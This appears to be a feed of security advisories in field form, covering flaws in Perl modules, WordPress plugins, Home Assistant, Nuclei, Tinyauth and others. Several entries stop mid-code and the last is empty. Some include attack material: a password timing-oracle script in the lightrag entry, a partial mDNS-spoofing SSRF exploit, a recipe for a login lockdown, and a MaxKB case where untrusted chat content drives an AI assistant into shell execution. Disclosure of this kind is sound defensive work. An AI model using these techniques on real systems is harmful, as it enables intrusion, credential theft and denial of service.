items.title:
Net::IDN::Punycode versions before 2.301 for Perl allow a heap buffer overflow via unchecked writes past the output buffer in encode_punycode.

The XS backend builds the encoded...
items.summary:
Net::IDN::Punycode versions before 2.301 for Perl allow a heap buffer overflow via unchecked writes past the output buffer in encode_punycode.

The XS backend builds the encoded label in the string buffer of the scalar it returns, sized from the input length. The loop that emits the digits of each code point checks for room before every write, but the write of the last digit of each round and the write of the terminating NUL do not, so an input whose encoded form fills the buffer writes past its end.

Only the XS backend is affected.

Encoding an attacker-supplied string corrupts the heap.

items.title: The Give Tributes plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 2.3.1 via deserialization of untrusted input . This makes it p...
items.summary: The Give Tributes plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 2.3.1 via deserialization of untrusted input . This makes it possible for unauthenticated attackers to inject a PHP Object. No known POP chain is present in the vulnerable software, which means this vulnerability has no impact unless another plugin or theme containing a POP chain is installed on the site. If a POP chain is present via an additional plugin or theme installed on the target system, it may allow the attacker to perform actions like delete arbitrary files, retrieve sensitive data, or execute code depending on the POP chain present. This vulnerability is only reachable when the "Allow Multiple Recipients" option is enabled for the donation form, as the single-recipient code path applies sanitize_textarea_field() which would neutralize the payload. Exploitation additionally requires the eCard "Custom Message" option to be disabled, which is the plugin default: when it is enabled the personalized message becomes a required field and GiveWP's give_clean() blanks serialized input during validation, causing the donation to be rejected before it is stored.

items.summary: The Meta Box AIO plugin for WordPress is vulnerable to Privilege Escalation to Administrator in versions up to, and including, 3.11.0. This is due to a chained flaw: the populate_via_query_string() function in the mb-frontend-submission component unconditionally overrides the form's target object_id from the GET parameter 'rwmb_frontend_field_object_id' without any authorization check, and Form::process() lacks the user_can_edit() check present in render(), allowing unauthenticated attackers to overwrite the post_content of any page with an arbitrary shortcode via wp_update_post(); the mb-user-profile component then directly trusts the 'role' and 'auto_login' shortcode attributes in the injected [mb_user_profile_register] shortcode with no role validation. This makes it possible for unauthenticated attackers to elevate their privileges to Administrator. The standalone plugins Meta Box Frontend Submission (in versions up to 4.5.6) and Meta Box User Profile (versions up to 3.11.0) are also affected.

items.summary: MaxKB is an open-source AI assistant for enterprise. Prior to version 2.10.5-lts, assistants with a tool, MCP tool, skill, or sub-application use SandboxShellBackend, which exposes an execute shell tool without excluding it and omits execute from interrupt_on, so human approval is not required. Untrusted chat or ingested content can therefore cause command execution; source deployments with MAXKB_SANDBOX disabled run commands directly as the application user, while the official root container's string-based gosu wrapper allowed shell metacharacters to execute outside the intended sandbox. This issue is fixed in version 2.10.5-lts.

items.summary: Warpgate is an open source SSH, HTTPS and MySQL bastion host for Linux. Prior to 0.25.5, the /@warpgate/api/sso/providers/:name/start endpoint stores an attacker-controlled next parameter that the POST /@warpgate/api/sso/return handler inserts without HTML escaping into the response generated by warpgate-protocol-http/src/api/sso_provider_list.rs. A victim who follows a crafted link and completes SSO can cause markup and JavaScript to execute in the authenticated Warpgate origin, allowing access to session data and actions through user APIs, and through administrator APIs only when the victim is an administrator. The GET /@warpgate/api/sso/return path also uses the same unvalidated value as a redirect destination, enabling an open redirect. This issue is fixed in version 0.25.5.

items.title: Email::Sender::Transport::Sendmail versions before 2.602 for Perl allow arbitrary command execution on Windows sending a message whose envelope address reaches the shell in _sen...
items.summary:
Email::Sender::Transport::Sendmail versions before 2.602 for Perl allow arbitrary command execution on Windows sending a message whose envelope address reaches the shell in _sendmail_pipe.

On MSWin32 the envelope sender and every recipient go into a single command string, which open() passes to a shell. Every other platform gets the list form, which runs sendmail directly. When the caller supplies no envelope, Email::Sender::Simple takes the recipients from the To and Cc headers and the sender from the From header.

An attacker who controls one of those header addresses runs commands as the sending process.

items.title: A caching flaw in the toolbox-core package of the mcp-toolbox-sdk-python SDK causes the same...
items.summary: A caching flaw in the toolbox-core package of the mcp-toolbox-sdk-python SDK causes the same Google ID token to be cached and reused across different audiences. If an application uses the SDK to authenticate to two or more different audiences within the same process, the module-level token cache fails to key its cached tokens by the requested audience. Consequently, a valid, unexpired token minted for a sensitive service (Service A) can be retrieved from the cache and sent to a secondary service (Service B). An attacker who operates, compromises, or monitors traffic to Service B can capture this token and replay it to impersonate the victim application against Service A.

items.title: A stored cross-site scripting (XSS) vulnerability was identified in GitHub Enterprise Server that...
items.summary: A stored cross-site scripting (XSS) vulnerability was identified in GitHub Enterprise Server that allowed an authenticated attacker to inject arbitrary HTML attributes into rendered Markdown because the Markdown rendering pipeline rewrote quote characters in already-sanitized HTML without re-sanitizing the result. Crafted Markdown could abuse same-origin JavaScript gadgets to bypass Content Security Policy and gain control of the page DOM when viewed by another user. Successful exploitation could allow an attacker to read content visible to the victim, extract embedded CSRF tokens, perform state-changing actions as the victim, and exfiltrate data through same-origin writes. The payload could also propagate to repositories and organizations where the victim had write access. This vulnerability affected supported GitHub Enterprise Server releases in the 3.17, 3.18, 3.19, 3.20, 3.21, and 3.22 series and was fixed in versions 3.22.1, 3.21.6, 3.20.8, 3.19.12, 3.18.15, and 3.17.21. This vulnerability was reported via the GitHub Bug Bounty program.

items.summary: ### Summary An authenticated party can add a malicious name to any statistics-capable entity, allowing for Cross-Site Scripting attacks against anyone who views a Statistics Graph card containing that entity, when they hover over any data point on the chart. **Payload** **Payload triggering** An alternative, and more impactful scenario, is that the entity gets a malicious name from the provider of the integration (e.g. Tibber, Shelly, or any HACS integration), and is exploited that way through the default name — without requiring any direct access to the Home Assistant instance. This is the same supply-chain vector as CVE-2025-62172. ### Details The Statistics Graph card renders entity names in ECharts tooltips as raw HTML. The offending line is in `src/components/chart/statistics-chart.ts`: https://github.com/home-assistant/frontend/blob/c13a80ce5e7ae39f0262444e2b6295a074a96732/src/components/chart/statistics-chart.ts#L236 Where **_`param.seriesName`_** is interpolated verbatim into the returned HTML string: ``` return `${time}${param.marker} ${param.seriesName}: ${value}`; ``` No call to `filterXSS()` is made — unlike the Energy dashboard chart, which was patched as part of CVE-2025-62172: ``` // FIXED in energy-chart-options.ts:268 return `${param.marker} ${filterXSS(param.seriesName!)}: ...`; ``` The `statistics-chart` component was not updated when the Energy chart was patched, leaving the same class of vulnerability in place. The existing entity and payload used for CVE-2025-62172 is also a valid exploit for this vulnerability: The name value flows through the following chain: 1. `name` is set from `getStatisticLabel(this.hass, statistic_id, meta)`: https://github.com/home-assistant/frontend/blob/c13a80ce5e7ae39f0262444e2b6295a074a96732/src/components/chart/statistics-chart.ts#L411 2. `getStatisticLabel` is defined here and calls `computeStateName(entity)`: https://github.com/home-assistant/frontend/blob/c13a80ce5e7ae39f0262444e2b6295a074a96732/src/data/recorder.ts#L329-L339 3. `computeStateName` is defined here — no HTML encoding is applied: https://github.com/home-assistant/frontend/blob/c13a80ce5e7ae39f0262444e2b6295a074a96732/src/common/entity/compute_state_name.ts The only transformation applied to the name is replacing underscores with spaces (`computeObjectId(entityId).replace(/_/g, " ")`), which does not prevent HTML injection. **NB:** Do note that only the fields `Mean, State, Sum and Change` are vulnerable. items.title: Home Assistant: mDNS Server-Side Request Forgery
items.summary:
## Summary

Home Assistant Green is vulnerable to a Server-Side Request Forgery (SSRF) via the mDNS/Zeroconf IPP integration. An unauthenticated attacker on the local network can send a crafted mDNS response to trick Home Assistant into making HTTP requests to arbitrary hosts, including internal services bound to localhost. The IPP integration automatically processes `_ipp._tcp.local` service announcements without any user interaction or authentication, and follows HTTP redirects from the attacker-controlled host.

## Details

Home Assistant listens for mDNS service announcements on port 5353. When a service of type `_ipp._tcp.local` is discovered, the IPP integration's zeroconf handler (`homeassistant/components/ipp/config_flow.py`) processes it automatically.

The `async_step_zeroconf` method extracts `host`, `port`, and `base_path` directly from the mDNS discovery info without validation:

```python
async def async_step_zeroconf(
    self, discovery_info: ZeroconfServiceInfo
) -> ConfigFlowResult:
    host = discovery_info.host
    port = discovery_info.port
    zctype = discovery_info.type
    name = discovery_info.name.replace(f".{zctype}", "")
    tls = zctype == "_ipps._tcp.local."
    base_path = discovery_info.properties.get("rp", "ipp/print")

    self.discovery_info.update(
        {
            CONF_HOST: host,
            CONF_PORT: port,
            CONF_SSL: tls,
            CONF_VERIFY_SSL: False,
            CONF_BASE_PATH: f"/{base_path}",
            CONF_NAME: name,
            CONF_UUID: unique_id,
        }
    )
```

These values are then passed to `validate_input()`, which constructs an HTTP request (IPP over HTTP) to the attacker-controlled host:

```python
async def validate_input(hass: HomeAssistant, data: dict) -> dict[str, Any]:
    session = async_get_clientsession(hass)
    ipp = IPP(
        host=data[CONF_HOST],
        port=data[CONF_PORT],
        base_path=data[CONF_BASE_PATH],
        tls=data[CONF_SSL],
        verify_ssl=data[CONF_VERIFY_SSL],
        session=session,
    )
    printer = await ipp.printer()
    return {CONF_SERIAL: printer.info.serial, CONF_UUID: printer.info.uuid}
```

The core issue is that during the intentional discovery and retrieval of additional device information, the HTTP session blindly follows redirects. This allows an attacker to point the request at `127.0.0.1` or other internal services that are not otherwise network-accessible.

An attacker crafts an mDNS response advertising a fake IPP printer that points to the attacker's IP. The attacker's HTTP server then responds with a **302 redirect** to any internal endpoint, causing Home Assistant to make the request on the attacker's behalf.

## PoC

The PoC demonstrates the SSRF by sending a crafted mDNS response that causes Home Assistant to connect to the attacker's HTTP server, which redirects the request to an internal service.

### Prerequisites

- Attacker machine on the same local network as the Home Assistant Green device
- Python 3 with dependencies: `pip install -r requirements.txt`

### Exploit Code

The core mDNS spoofing function builds and sends a DNS response advertising a fake IPP printer:

```python
def build_dns_response(service_name, service_type, attacker_ip, attacker_port):
    transaction_id = 0x0000  # mDNS always 0
    flags = 0x8400           # Standard response, authoritative answer
    qdcount = 0
    ancount = 4              # 4 answers (service_type, SRV, TXT, A)
    nscount = 0
    arcount = 0

    SRV = service_name + '.' + service_type
    header = struct.pack("!HHHHHH", transaction_id, flags, qdcount, ancount, nscount, arcount)

    def encode_name(name):

items.title: Traefik: BasicAuth singleflight coalescing reintroduces an unauthenticated username-enumeration timing oracle
items.summary:
## Summary

Traefik's BasicAuth middleware coalesces concurrent credential checks through a `singleflight.Group` to avoid hashing the same password many times at once. Since v3.6.11 the deduplication key was built from the submitted password plus the stored secret, so it depended on server state: a non-existent username collapsed onto one shared key while each configured username produced its own. Under attacker-controlled concurrency, a probe request arriving inside a leader request's in-flight window is served the leader's fast coalesced result when the username does not exist, but computes its own hash (slow) when the username exists — reintroducing, only in the concurrent case, the unauthenticated username-enumeration timing oracle that GHSA-g3hg-j4jv-cwfr had hardened for sequential probing. The fix derives the singleflight key from the submitted credentials (username and password) only, so it no longer depends on whether the account exists or on any stored secret. Traefik v2 is not affected: the v2.11 BasicAuth middleware does not use singleflight coalescing, and Digest authentication is not affected. The impact is limited to username enumeration; no credential disclosure or authentication bypass is possible.

The vulnerability originates on the v3.6 line, which has reached end of life; users on v3.6 or earlier v3.x must upgrade to v3.7.13 to receive the fix.

## Patches

- https://github.com/traefik/traefik/releases/tag/v3.7.13

## For more information

If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

- username absent, `secret == ""`, key `= len(P) + ":" + P`

Every non-existent username therefore lands on one shared key, while every configured username gets its own. `singleflight.Group.Do` makes a follower on an equal key block on the leader's in-flight computation and return the leader's result. So an attacker who sends a leader request with a junk username and password `P`, then sends the probe for target `T` with the same `P` late inside the leader's window, reads user existence directly off the probe's latency: coalesced (fast) means `T` does not exist, own hash (slow) means `T` does exist.

This is the exact information leak that the `notFoundSecret` dummy hash at line 127 exists to remove. Sequential probing is fully equalised (measured ratio 1.00x, so the fix for `cwfr` / `8j2h` does work); the leak reappears only under attacker-controlled concurrency. Confirmed on the current `v3.7` head, which already carries the `8mrf` singleflight fix, and on `master` (no later fix exists).

- `pkg/middlewares/auth/basic_auth.go:125` (`checkPassword`)

	return match.(bool)
}

items.title: lightrag-hku: Plaintext Passwords Compared Without Constant-Time Function
items.summary:
### Summary
When plaintext passwords are stored in AUTH_ACCOUNTS, the comparison uses Python's == operator which is not constant-time. An attacker with low-latency access can exploit timing differences to recover the password character by character.

### Details

```python
# lightrag/api/passwords.py:13-26
def verify_password(plain_password: str, stored_password: str) -> bool:
    if stored_password.startswith("{bcrypt}"):
        ...
        return bcrypt.checkpw(...)    # constant-time  OK

    return stored_password == plain_password  # NOT constant-time  VULN
    #   Python == short-circuits on first mismatched byte
    #   Timing leaks: password length + individual characters
```

### PoC

```python
# Timing oracle: recover password char-by-char
import httpx, time, string

TARGET = "http://<TARGET>:9621/login"
USER   = "admin"

def measure(pwd: str) -> float:
    t = time.perf_counter()
    httpx.post(TARGET, data={"username": USER, "password": pwd})
    return time.perf_counter() - t

known = ""
for _ in range(32):
    best = max(string.printable,
               key=lambda c: sum(measure(known+c+"A"*20) for _ in range(10)))
    known += best
    print(f"Recovered: {known}")
```

### Impact
Observable timing discrepancy. Attackers with low-latency access can recover plaintext passwords character by character without triggering brute-force limits. Only affects deployments using unhashed passwords in AUTH_ACCOUNTS.

items.title: Nautobot: Authorization bypass in approval workflow REST API allows self-approval and unauthorized activation of scheduled jobs
items.summary:
### Impact
This is an authorization bypass that escalates into unauthorized server-side job execution.

1. Primary impact - self-approval: The approver checks (approver-group membership, `change` permission on the object under review, one-response-per-user) are enforced only in the `approve`/`deny` actions on `ApprovalWorkflowStage`. The generic `ApprovalWorkflowStageResponse` create endpoint enforces none of them, so a user holding only `extras.add_approvalworkflowstageresponse` can `POST` approved responses directly and drive a stage past its `min_approvers` threshold with no legitimate approver involved. The serializer also exposes `user` and `state` as writable, letting the attacker attribute responses to arbitrary users.

2. Escalated impact  job activation: Because the approval workflow gates a `ScheduledJob`, self-approval does not stop at the approval record. Stage approval cascades through `ApprovalWorkflow.save()` to `on_workflow_approved()`, which sets the target job to enabled/active.

### Patches

Fixed in Nautobot v3.1.8

### Workarounds
Restrict the `extras.add_approvalworkflowstageresponse` permission so that no untrusted user holds it; approval responses should only ever be created via the stage `approve`/`deny` actions. There is no configuration flag that disables the generic create endpoint prior to the patch.

items.title: Nuclei: Environment Variable Disclosure via Response-Derived Data in DAST/Fuzz Mode
items.summary:
A vulnerability in Nuclei's DAST/fuzz expression evaluation path allows a malicious target server to trigger disclosure of scanner-host environment variables when the `-env-vars` / `-ev` option is explicitly enabled.

This is an incomplete fix for [CVE-2026-41645](https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-jm34-66cf-qpvr) / GHSA-jm34-66cf-qpvr. The original fix hardened `expressions.Evaluate()` to be single-pass within one call, but did not address callers that invoked evaluation multiple times on substituted output in the DAST/fuzz pipeline.

**Affected Component**

The issue is in the DAST/fuzz payload evaluation path (`pkg/fuzz/parts.go`) and the shared template rendering boundary. When a multi-step template captures response data via an internal extractor and reuses it in a subsequent fuzz step, the fuzz evaluator could treat the substituted response content as fresh template syntax on a second evaluation pass.

**Description**

In DAST/fuzz mode, payload evaluation previously ran expression substitution more than once on the same value. Response-derived content captured by an `internal: true` extractor in a prior protocol step could flow into a fuzz payload and be reinterpreted as DSL/helper syntax on a subsequent pass.

When `-env-vars` (`-ev`) is enabled, environment variables are merged into the template variable map. A malicious target can return response data containing expressions like `{{env_var_name}}` which, when reused in a subsequent fuzz step, resolve to actual environment variable values. This can expose sensitive host data such as API keys, credentials, and tokens.

Without `-ev` enabled (the default), response-derived data may still cause other DSL helpers to run, but that behavior is not treated as a security issue and has no meaningful security impact beyond unexpected behavior.

> [!NOTE]
The `-env-vars` / `-ev` option is off by default. Users who have not explicitly enabled it are not affected by this vulnerability.

**Affected Users**

- **CLI users** running `nuclei -dast` (or fuzzing) with multi-step templates that chain an internal extractor into a subsequent fuzz step against untrusted targets, with the `-ev` flag enabled.
- **SDK users** who integrate Nuclei with the fuzz pipeline enabled, `EnvironmentVariables` set to `true`, and scan targets that are not fully trusted.

**Patches**

- The vulnerability is fixed in Nuclei v3.10.0. Upgrading is strongly recommended.
- Fix reference: https://github.com/projectdiscovery/nuclei/pull/7499
- Related original fix: https://github.com/projectdiscovery/nuclei/pull/7221, https://github.com/projectdiscovery/nuclei/pull/7321

**Mitigation**

Upgrade to Nuclei v3.10.0, where template-authored text is rendered once through a shared rendering boundary and runtime values from responses, extractors, and constants remain opaque data.

If you have `-ev` enabled, disable it when scanning untrusted targets to avoid environment variable disclosure.

**Workarounds**

If upgrading is not an option, ensure `-env-vars` / `-ev` is not enabled when running DAST/fuzz scans with multi-step templates against untrusted targets.

**Acknowledgments**

Thanks to @BerSecHub for reporting this issue.

items.title: Nuclei: Local File Read via Workflow File-Protocol Gate Bypass
items.summary:
A vulnerability in Nuclei's workflow template loader allows `file:` protocol templates to execute without the `-file` flag, bypassing a security gate that is meant to prevent local file reads on the scanner host.

**Affected Component**

The issue is in the workflow template loading path. The main template loader enforces the `-file` gate for file-protocol templates, but the workflow loader did not apply the same check when resolving templates referenced by a workflow.

**Description**

Nuclei disables file-protocol templates by default because they read local files from the host running the scanner. Operators must explicitly enable them with the `-file` flag. When a workflow references a file-protocol template, the workflow loader accepted and executed that template without verifying that `-file` was enabled.

Because workflows run unsigned by default, an untrusted workflow could load and execute a file-protocol template and read local files from the scan target path, even though the operator had not enabled file templates.

> [!NOTE]
File-protocol templates are disabled by default. This issue only affects users who run workflows from untrusted sources without having explicitly enabled `-file`.

**Affected Users**

- **CLI users** running workflows (`-w`) that reference file-protocol templates from untrusted or third-party sources.
- **SDK users** who integrate Nuclei into platforms where end users can supply workflow files and rely on the default `-file` restriction to block local file access.

**Patches**

- The vulnerability is fixed in Nuclei v3.10.0. Upgrading is strongly recommended.
- Fix reference: https://github.com/projectdiscovery/nuclei/pull/7489

**Mitigation**

Upgrade to Nuclei v3.10.0, where template execution requirements (including the `-file` gate) are enforced consistently across the main loader, workflow parsing, and request compilation paths.

In the meantime, avoid running workflows from unverified sources.

**Workarounds**

If upgrading is not an option, do not run untrusted workflow files. There is no configuration flag that mitigates this bypass on affected versions.

**Acknowledgments**

Thanks to @daffainfo for reporting this issue.

items.title: Nuclei: Local File Read via MySQL Client Sandbox Bypass
items.summary:
A vulnerability in Nuclei's JavaScript MySQL client library allows arbitrary local file reads that bypass the `-allow-local-file-access` (`-lfa`) sandbox restriction.

**Affected Component**

The issue is in the `nuclei/mysql` JavaScript library used by `javascript:` protocol templates. The MySQL client connection logic did not enforce the local file access sandbox when handling the `allowAllFiles` DSN parameter used by `LOAD DATA LOCAL INFILE`.

**Description**

Without `-lfa`, Nuclei confines local file access to the templates directory. However, a `javascript:` template could connect to a MySQL server with `allowAllFiles=true` in the connection DSN. With this option enabled, a malicious MySQL server can issue `LOAD DATA LOCAL INFILE` requests for arbitrary paths on the scanner host. The MySQL client reads the full file contents and sends them to the server, bypassing the same sandbox that blocks direct filesystem reads through other APIs.

`javascript:` templates execute without the `-code` flag and unsigned `javascript:` templates run by default, making this reachable from untrusted third-party templates when scanning attacker-controlled MySQL endpoints.

> [!NOTE]
The `-allow-local-file-access` (`-lfa`) option is off by default. This issue allows bypassing that restriction, not merely expanding an already-enabled capability.

**Affected Users**

- **CLI users** running untrusted or third-party `javascript:` templates against MySQL-compatible targets.
- **SDK users** who integrate Nuclei into platforms where end users can supply JavaScript templates and rely on the default `-lfa` restriction to limit filesystem access.

**Patches**

- The vulnerability is fixed in Nuclei v3.10.0. Upgrading is strongly recommended.
- Fix reference: https://github.com/projectdiscovery/nuclei/pull/7473

**Mitigation**

Upgrade to Nuclei v3.10.0, where the `allowAllFiles` DSN option is stripped unless `-lfa` is explicitly enabled.

In the meantime, avoid running JavaScript templates from unverified sources, especially against untrusted database endpoints.

**Workarounds**

If upgrading is not an option, avoid running untrusted JavaScript templates. There is no flag or configuration that mitigates this bypass on affected versions.

**Acknowledgments**

Thanks to @daffainfo for reporting this issue.

items.title: Nuclei: Arbitrary Command Execution via DAST Code Signature Bypass
items.summary:
A vulnerability in Nuclei's DAST template loading path allows unsigned `code:` protocol templates to execute, bypassing the cryptographic signature requirement that is meant to prevent arbitrary command execution from untrusted templates.

**Affected Component**

The issue is in the template loader's DAST loading branch. When `-dast` is enabled and a template contains a `fuzzing:` block, the loader accepted the template through a code path that omitted the unsigned-code-template signature check present in the normal loading branch.

**Description**

Nuclei requires `code:` protocol templates to be cryptographically signed before execution. Unsigned code templates are normally skipped with a warning. However, when a template combined a `fuzzing:` block (making it DAST-eligible) with an unsigned `code:` block, enabling `-dast` routed the template through the DAST loader branch, which did not enforce signature verification.

For multiprotocol templates containing both HTTP and `code:` blocks, the unsigned code request was included in the execution queue regardless of whether `-code` was set. This allowed arbitrary shell command execution from an unsigned `code:` block with only `-dast` enabled.

> [!NOTE]
Both DAST mode (`-dast`) and code-protocol templates are disabled by default. Code templates normally require both the `-code` flag and a valid template signature. This issue bypassed the signature and `-code` controls only when `-dast` was explicitly enabled.

**Affected Users**

- **CLI users** running DAST/fuzzing scans (`-dast`) with untrusted or attacker-supplied templates that contain both `fuzzing:` and `code:` blocks.
- **SDK users** who integrate Nuclei with DAST mode enabled and allow end users to supply custom templates.

**Patches**

- The vulnerability is fixed in Nuclei v3.10.0. Upgrading is strongly recommended.
- Fix reference: https://github.com/projectdiscovery/nuclei/pull/7472

**Mitigation**

Upgrade to Nuclei v3.10.0, where code template signature verification is enforced before DAST loading.

In the meantime, avoid running DAST scans with untrusted templates.

**Workarounds**

If upgrading is not an option, do not use `-dast` with templates from unverified sources.

**Acknowledgments**

Thanks to @daffainfo for reporting this issue.

items.title: Nuclei: Arbitrary Code Execution via Goja JavaScript Engine Vulnerability
items.summary:
A vulnerability in the Goja JavaScript engine used by Nuclei's `javascript:` protocol allows arbitrary native code execution on the scanner host when running untrusted JavaScript templates.

**Affected Component**

The issue is in the Goja JavaScript runtime embedded in Nuclei's JavaScript protocol (`pkg/js/`). An out-of-bounds heap write in the engine can be exploited to achieve native code execution during template evaluation.

**Description**

Nuclei uses the Goja engine to execute `javascript:` protocol templates. A memory safety vulnerability in Goja allows attacker-controlled JavaScript to corrupt heap memory and execute arbitrary native code on the host running Nuclei.

Because `javascript:` templates execute without the `-code` flag and unsigned JavaScript templates run by default, a malicious template from an untrusted source can trigger code execution during a normal scan. The vulnerability could also be reached through a template's `init` section, which runs during template initialization before other security checks complete.

> [!NOTE]
JavaScript templates do not require the `-code` flag and are not subject to the code-template signing requirement on affected versions. Nuclei v3.11.0 adds a separate signing requirement for JavaScript templates as additional defense in depth.

**Affected Users**

- **CLI users** running untrusted or third-party `javascript:` templates.
- **SDK users** who integrate Nuclei into platforms where end users can supply JavaScript templates.

**Patches**

- The vulnerability is fixed in Nuclei v3.10.0 by updating the Goja dependency. Upgrading is strongly recommended.
- Fix reference: https://github.com/projectdiscovery/nuclei/pull/7467
- Additional hardening in v3.11.0 requires cryptographic signatures for JavaScript templates: https://github.com/projectdiscovery/nuclei/pull/7514

**Mitigation**

Upgrade to Nuclei v3.10.0 or later. For additional protection, upgrade to v3.11.0 where JavaScript templates also require valid signatures.

In the meantime, avoid running JavaScript templates from unverified sources.

**Workarounds**

If upgrading is not an option, do not run untrusted JavaScript templates. There is no configuration flag that mitigates native code execution on affected versions.

**Acknowledgments**

Thanks to Dylan Pindur ([@dpindur](https://github.com/dpindur)) and Adam Kues ([@akues-an](https://github.com/akues-an)) of the Assetnote security research team for reporting this issue through responsible disclosure via security@projectdiscovery.io.

items.title: Tinyauth: Unauthenticated login attempts can trigger global login lockdown denial of service
items.summary:
### Summary

Tinyauth's login rate-limit bookkeeping can enter a global lockdown mode when its in-memory login-attempt map reaches 256 distinct identifiers. Because unauthenticated `POST /api/user/login` requests for unknown usernames are recorded in this same map, a remote unauthenticated attacker can submit 257 unique bogus usernames and cause valid credentials for unrelated users to be treated as locked until `auth.loginTimeout` expires.

This was confirmed against the stable `v5.0.7` release. With default configuration, `auth.loginTimeout` is 300 seconds and `auth.loginMaxRetries` is 3, so the denial lasts about 5 minutes and can be repeated.

### Details

In stable `v5.0.7`, the login endpoint is registered at `internal/controller/user_controller.go:45` and accepts unauthenticated JSON credentials in `loginHandler` at `internal/controller/user_controller.go:50`. Before validating credentials, it calls `controller.auth.IsAccountLocked(req.Username)` at `internal/controller/user_controller.go:65`.

When a username does not exist, the login handler records a failed login attempt for the attacker-controlled username with `controller.auth.RecordLoginAttempt(req.Username, false)` at `internal/controller/user_controller.go:83`. Invalid passwords for existing users do the same at `internal/controller/user_controller.go:94`.

The rate-limit map has a hard cap of 256 records at `internal/service/auth_service.go:29`. `RecordLoginAttempt` checks `len(auth.loginAttempts) >= MaxLoginAttemptRecords` at `internal/service/auth_service.go:261` and, once the cap is reached, launches `auth.lockdownMode()` at `internal/service/auth_service.go:265` instead of evicting old identifiers or rejecting only the new identifier.

`lockdownMode` sets a global `auth.lockdown` value with `Active: true` and `ActiveUntil: now + auth.config.LoginTimeout` at `internal/service/auth_service.go:790-804`. `IsAccountLocked` checks this global lockdown before looking up the requested identifier at `internal/service/auth_service.go:227-234`, so every username is treated as locked while the global lockdown is active.

The default configuration enables this path with `LoginTimeout: 300` and `LoginMaxRetries: 3` at `internal/config/config.go:23-24`.

Source-to-sink path:

```text
Unauthenticated POST /api/user/login JSON username
  -> loginHandler binds LoginRequest
  -> unknown username path records RecordLoginAttempt(attacker-chosen username, false)
  -> 257 unique identifiers fill loginAttempts beyond MaxLoginAttemptRecords
  -> RecordLoginAttempt starts lockdownMode()
  -> lockdownMode sets global auth.lockdown.Active = true

items.summary:
# tinyauth: forward-auth per-app ACL is matched case-sensitively against the (case-insensitive) hostname, letting an authenticated user reach apps they are not on the allowlist for



## GitHub Advisory Details (form fields — paste-ready)

**Affected products**
| Field | Value |
|-------|-------|
| Ecosystem | `Other (self-hosted)` / Go |
| Package name | `github.com/steveiliop56/tinyauth` (forward-auth middleware) |
| Affected versions | `< 5.1.2` |
| Patched versions | `5.1.2` |

**Advisory details**
| Field | Value |
|-------|-------|
| Title | tinyauth forward-auth authorization bypass: per-app ACL host matching is case-sensitive while hostnames are case-insensitive, so a mixed-case host defeats `users`/`groups`/`ip` allowlists and fails open |

- **Status:** Runtime-confirmed (local lab, 127.0.0.1 only)
- **Target:** steveiliop56/tinyauth `v5.0.7` (commit `479f1657812b7bf01438607464dedaa148155301`); root cause also present on `main` HEAD
- **Component:** `internal/service/access_controls_service.go` (`lookupStaticACLs` / `GetAccessControls`), `internal/service/docker_service.go` (`GetLabels`), `internal/controller/proxy_controller.go` (`proxyHandler`)
- **Class:** Broken access control / authorization bypass across the per-app trust boundary

## Summary

tinyauth is a forward-auth service: a reverse proxy (Traefik/Caddy/nginx/Envoy) calls `GET /api/auth/<proxy>` on every request and only forwards the request upstream if tinyauth returns `200`. tinyauth decides *which* per-app access rules apply by looking up the forwarded hostname (the app) in its ACL set — the static `apps:` config and/or Docker labels. Each app can restrict access with `users.allow` / `users.block`, `oauth.whitelist`, `oauth.groups` / `ldap.groups`, and `ip.allow`. These allowlists are the entire authorization model that separates one protected app from another for a shared pool of authenticated users.

The hostname → ACL lookup is performed with **case-sensitive** Go string comparisons (`config.Config.Domain == domain` and `strings.SplitN(domain, ".", 2)[0] == app`). Hostnames, however, are case-*insensitive* everywhere else in the stack: DNS, HTTP `Host`-header routing, and TLS SNI all treat `immich.example.com` and `IMMICH.example.com` as the same host, so a reverse proxy routes both to the same backend. When a request arrives with a mixed-case host, the proxy still routes it to the intended app and faithfully forwards the mixed-case value in `X-Forwarded-Host` (or `X-Original-URL` for nginx, or `Host` for Envoy), but tinyauth's case-sensitive lookup **misses** the app's ACL entry.

On a miss, tinyauth does not fail closed. `GetAccessControls` falls back to `DockerService.GetLabels`, which returns an **empty `config.App{}` with no error** whenever nothing matches (or Docker is not connected). The proxy handler then evaluates that empty App: `IsAuthEnabled` → true, `CheckIP` (no allow/block) → allowed, `IsUserAllowed` with an empty `users.allow` → `CheckFilter("", …)` → **true**, and the group check with empty required groups → **true**. The net result is that any *already-authenticated* user is authorized (`200 Authenticated`) for an app whose ACL was supposed to exclude them — simply by upper-casing (or otherwise re-casing) one letter of the hostname. This defeats the per-app `users`/`groups`/`ip` allowlist for every proxy integration.

## Affected code (v5.0.7, commit `479f1657…`)

The ACL lookup uses case-sensitive equality — `internal/service/access_controls_service.go`:

```go
func (acls *AccessControlsService) lookupStaticACLs(domain string) (config.App, error) {
	for app, config := range acls.static {
		if config.Config.Domain == domain {              // case-sensitive ==
			return config, nil
		}
		if strings.SplitN(domain, ".", 2)[0] == app {    // case-sensitive ==
			return config, nil
		}
	}
	return config.App{}, errors.New("no results")
}

	app, err

items.title: Tinyauth: User enumeration attack by timing oracle
items.summary:
### Summary
It's possible to enumerate users through a timing oracle. In other words: I can easily check if a username exists or not by observing the timing differences between logins.

### PoC
Setup a tinyauth server with a local user. It can be over the network.

Try to log in with the local user, using an incorrect password: there is a noticeable delay. You know that the user exists.

Now try to log in with a username that does not exist, using an incorrect password: it will complete almost immediately. You know that the user does not exist.

### Expected vs actual behavior

Login attempts should take roughly the same amount of time when the user exists vs when the user does not exist.
Right now, nonexistent user attempts are way faster, meaning if your login attempt is slow, then the username exists for sure.

### Details

Existing usernames will take an extra ~50 milliseconds to respond to login attempts, while non-existing usernames will take only ~50 microseconds (1000x less time) to return an incorrect password response.

Even taking network traffic into consideration, it is trivial to check whether a local user exists or not.

=== Existing user, wrong password ===
  #1: 50.52ms
  #2: 46.24ms
  #3: 43.57ms

=== Nonexistent user ===
  #1: 43.03µs
  #2: 48.45µs
  #3: 59.33µs

### Suggested fix

This can be solved by checking a dummy password hash when a user is not found before returning a query, this will mimic the exact same delay irrelevant of hardware capabilities.

Potential patch:
```

index f49c85a..f70c9e7 100644
--- a/internal/middleware/context_middleware.go

items.title: OpenBao Skips Stricter Deny Policy for LIST operations
items.summary:
## Impact

